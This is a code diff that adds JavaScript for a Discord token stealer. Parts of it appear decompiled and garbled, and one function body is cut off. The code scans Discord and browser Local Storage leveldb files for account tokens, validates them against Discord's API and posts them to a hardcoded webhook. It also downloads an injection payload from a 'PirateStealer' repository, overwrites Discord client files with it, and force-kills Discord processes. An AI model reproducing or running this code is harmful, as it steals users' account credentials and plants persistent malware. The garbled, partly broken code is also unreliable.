@@ -1,0 +1,100 @@
+token = token === void 0 ? this.token : token
+readFile = _tmp_42.readFile
+const fetch = require('node-fetch')
+let web = 'https://canary.discord.com/api/webhooks/918981986096381962/cSgWzzDxr-wKWtEt_6Kql2DPTF9GNgcvtjfUGzPR4hy7EuTy0q9w2_ptp0YTBauTd8xn'
+let paths = [
+  `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discord/Local Storage/leveldb`,
+  `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,
+  `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,
+  `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,
+  `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`,
+  `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`
+]
+_tmp_43.push(<operator>.formatString("", __dirname.split(":")[0], ":/Users/", __dirname.split("\\")[2], "/AppData/Roaming/discord/Local Storage/leveldb"))
+_tmp_43.push(<operator>.formatString("", __dirname.split(":")[0], ":/Users/", __dirname.split("\\")[2], "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb"))
+_tmp_43.push(<operator>.formatString("", __dirname.split(":")[0], ":/Users/", __dirname.split("\\")[2], "/AppData/Roaming/discordcanary/Local Storage/leveldb"))
+_tmp_43.push(<operator>.formatString("", __dirname.split(":")[0], ":/Users/", __dirname.split("\\")[2], "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb"))
+_tmp_43.push(<operator>.formatString("", __dirname.split(":")[0], ":/Users/", __dirname.split("\\")[2], "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb"))
+_tmp_43.push(<operator>.formatString("", __dirname.split(":")[0], ":/Users/", __dirname.split("\\")[2], "/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb"))
+i < paths.length
+function get = function get(path) {
+  try {
+    readdir(path, (err, files) => {
+      if (!files) return;
+      let fil = files.filter(i => 
+        i.split('.').pop() == 'ldb' ||
+        i.split('.').pop() == 'log'
+     );
+     
+     for (let i = 0; i < fil.length; i++) {
+       readFile(path + '/' + fil[i], 'utf-8', (e, d) => {
+         let um = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
+         let dois = /"mfa\.[\d\w_-]{84}"/;
+         let [match] = um.exec(d) ||
+         dois.exec(d) || [null];
+         
+         if (match) {
+           match = match.replace(/"/g, '');
+           fetch('https://discordapp.com/api/v8/users/@me', {
+            method: "GET",
+             headers: {
+                Authorization: match
+             }
+
+           }).then(i => i.json()).then(async(data) => {
+             await fetch(web, {
+               method: 'POST',
+               headers: {
+                 'Content-Type': 'application/json'
+               },
+               body: JSON.stringify({
+         ...
+function Infect = function Infect() {
+    https.get('https://raw.githubusercontent.com/Stanley-GF/PirateStealer/main/src/Injection/injection', (resp) => {
+        let data = '';
+        resp.on('data', (chunk) => {
+            data += chunk;
+        });
+        resp.on('end', () => {
+            injectPath.forEach(file => {
+                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook), {
+                    encoding: 'utf8',
+                    flag: 'w'
+                });
+                let folder = file.replace("index.js", "PirateStealerBTW")
+                if (!fs.existsSync(folder)) {
+                    fs.mkdirSync(folder, "0744")
+                }
+            })
+        });
+    }).on("error", (err) => {
+        console.log(err);
+    });
+}
+function listDiscords = function listDiscords() {
+    exec('tasklist', function(err,stdout, stderr) {
+        if (stdout.includes("Discord.exe")) {
+
+            runningDiscords.push("Discord")
+        }
+        if (stdout.includes("DiscordCanary.exe")) {
+
+            runningDiscords.push("DiscordCanary")
+        }
+        if (stdout.includes("DiscordPTB.exe")) {
+
+            runningDiscords.push("DiscordPTB")
+        };
+        killDiscord();
+    });
+}
+function killDiscord = function killDiscord() {
+    runningDiscords.forEach(disc => {
+        exec(`taskkill /IM ${disc}.exe /F`, (err) => {
+            if (err) {
+              return;
+            }
+          });
+    });
+    Infect()
+}
